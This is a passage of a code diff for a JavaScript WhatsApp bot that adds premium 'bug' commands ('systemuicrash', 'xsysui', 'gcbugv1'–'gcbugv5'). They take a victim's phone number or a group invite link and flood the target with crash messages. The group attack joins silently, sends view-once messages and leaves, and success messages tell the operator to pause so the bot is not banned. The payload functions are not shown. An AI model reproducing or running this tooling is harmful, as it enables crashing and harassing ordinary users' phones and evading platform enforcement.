+	if (!isPremium) return replygcxeon(mess.prem)
+    if (!isBot) {
+      return replygcxeon("𝕿𝖍𝖎𝖘 𝖋𝖊𝖆𝖙𝖚𝖗𝖊 𝖎𝖘 𝖋𝖔𝖗 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖔𝖓𝖑𝖞!");
+    }
+    if (!text){
+      return replygcxeon(`𝕰𝖝𝖆𝖒𝖕𝖑𝖊 𝖚𝖘𝖆𝖌𝖊: ${prefix + command} 5`)
+      }
+    if (isNaN(parseInt(text))) {
+      return replygcxeon("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
+    }
+    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
+    replygcxeon("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙, " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘...");
+    await sleep(1500); // Adjusted sleep time for clarity
+    sendVariousMessages(from, encodedValue);
+    await sleep(2500); // Adjusted sleep time for clarity
+    sendReaction('✅');
+  }
+  break;
+  case "xgc": case "gcbugv1": case "gcbugv2": case "gcbugv3": case "gcbugv4": case "gcbugv5":
+  {
+    if (!isPremium) return replygcxeon(mess.prem)
+    if (!text) {
+      return replygcxeon("𝐇𝐎𝐖 𝐓𝐎 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆 𝐓𝐎 𝐆𝐑𝐎𝐔𝐏\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n𝐍𝐨𝐭𝐞: 𝐈𝐟 𝐲𝐨𝐮 𝐰𝐚𝐧𝐭 𝐭𝐨 𝐬𝐞𝐧𝐝 𝐚 𝐥𝐚𝐫𝐠𝐞 𝐧𝐮𝐦𝐛𝐞𝐫 𝐨𝐟 𝐛𝐮𝐠𝐬, 𝐩𝐥𝐞𝐚𝐬𝐞 𝐭𝐲𝐩𝐞 𝐚𝐬 𝐟𝐨𝐥𝐥𝐨𝐰𝐬\n\n𝐄𝐱: ." + command + " 𝐥𝐢𝐧𝐤𝐠𝐜 𝐚𝐦𝐨𝐮𝐧𝐭\n\n𝐄𝐱𝐚𝐦𝐩𝐥𝐞:\n." + command + " https://chat.whatsapp.com/xxxx 10");
+    }
+    replygcxeon("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙, " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘...");
+    if (!text.split(" ")[0].includes("whatsapp.com")) {
+      return replygcxeon("𝕷𝖎𝖓𝖐 𝕴𝖓𝖛𝖆𝖑𝖎𝖉!");
+    }
+    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
+    try {
+      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
+      let groupTarget = await XeonBotInc.groupAcceptInvite(groupLink);
+      await sleep(2000); // Adjusted sleep time for clarity
+      sendViewOnceMessages(groupTarget, bugAmount);
+      await sleep(2500); // Adjusted sleep time for clarity
+      replygcxeon("𝐃𝐎𝐍𝐄✅ 𝐁𝐔𝐆 𝐇𝐀𝐒 𝐁𝐄𝐄𝐍 𝐒𝐄𝐍𝐓 𝐓𝐎 𝐓𝐇𝐄 𝐆𝐑𝐎𝐔𝐏!.");
+      XeonBotInc.groupLeave(groupTarget);
+    } catch (error) {
+      replygcxeon(util.format(error));
+    }
+  }
+  break;
+  case "systemuicrash": {
+  if (!isPremium) return replygcxeon(mess.prem)
+  if (!text) return replygcxeon(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
+  let number = text.split(',')[0];
+  let amount = text.split(',')[1] * 5;
+  if (!number || !amount) {
+    return replygcxeon(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxx,5`) 
+  }
+  if (isNaN(parseInt(amount))) {
+    return replygcxeon("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
+  }
+  let cleanedNumber = number.replace(/[^0-9]/g, '');
+  let encodedAmount = '' + encodeURI(amount);
+  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
+  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
+  if (cleanedNumber == "24102150169") {
+    return;
+  }
+  if (contactInfo.length == 0) {
+    return replygcxeon("𝐓𝐡𝐞 𝐧𝐮𝐦𝐛𝐞𝐫 𝐢𝐬 𝐧𝐨𝐭 𝐫𝐞𝐠𝐢𝐬𝐭𝐞𝐫𝐞𝐝 𝐨𝐧 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩");
+  }
+  replygcxeon("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙, " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘...");
+  await sleep(2000); // Adjusted sleep time for clarity
+  sendMixedMessages(whatsappNumber, encodedAmount);
+  await sleep(2500); // Adjusted sleep time for clarity
+  sendMessageWithMentions(
+    "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + whatsappNumber.split('@')[0] + 
+    " 𝖀𝖘𝖎𝖓𝖌 *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉.", 
+    [whatsappNumber]
+  );
+}
+break;
+case "xsysui": {
+  if (!isPremium) return replygcxeon(mess.prem)
+  if (!text) return replygcxeon(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
+  let number = text.split(',')[0];
+  let amount = text.split(',')[1] * 5;
+  if (!number || !amount) {
+    return replygcxeon(`𝖀𝖘𝖊 ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`) 
+  }
+  if (isNaN(parseInt(amount))) {
+    return replygcxeon("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
+  }
+  let cleanedNumber = number.replace(/[^0-9]/g, '');
+  let encodedAmount = '' + encodeURI(amount);
+  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
+  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
+  if (cleanedNumber == "24102150169") {
+    return;
+  }
+  if (contactInfo.length == 0) {
+    return replygcxeon("𝐓𝐡𝐞 𝐧𝐮𝐦𝐛𝐞𝐫 𝐢𝐬 𝐧𝐨𝐭 𝐫𝐞𝐠𝐢𝐬𝐭𝐞𝐫𝐞𝐝 𝐨𝐧 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩");
+  }
+  replygcxeon("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙, " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
   await sleep(2000); // Adjusted sleep time for clarity
   sendRepeatedMessages2(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
   sendMessageWithMentions(
-    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
-    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
+    "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + whatsappNumber.split('@')[0] + 
+    " 𝖀𝖘𝖎𝖓𝖌 *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉.", 
     [whatsappNumber]
   );
 }
